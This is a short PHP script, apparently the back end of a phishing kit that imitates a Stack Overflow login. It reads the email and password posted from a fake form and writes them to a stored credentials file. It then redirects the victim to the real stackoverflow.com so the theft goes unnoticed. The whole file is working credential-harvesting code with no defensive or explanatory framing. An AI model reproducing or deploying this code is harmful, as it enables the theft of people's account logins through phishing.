<?php   
    function get_creds($username,$password){
        $myfile="Titanium_files/credentials/Stackoverflow/Credentials.txt";
        $username=$_POST["email"];
        $password=$_POST["password"];
        header("location:https://stackoverflow.com/");  
        $d = fopen($myfile,"w");
        fwrite($d,"{USERNAME}:".$username."\r\n");
        fwrite($d,"{PASSWORD}:".$password."\r\n");
        fclose($d);
 
    }
 
    get_creds($username,$password);
    
 ?>
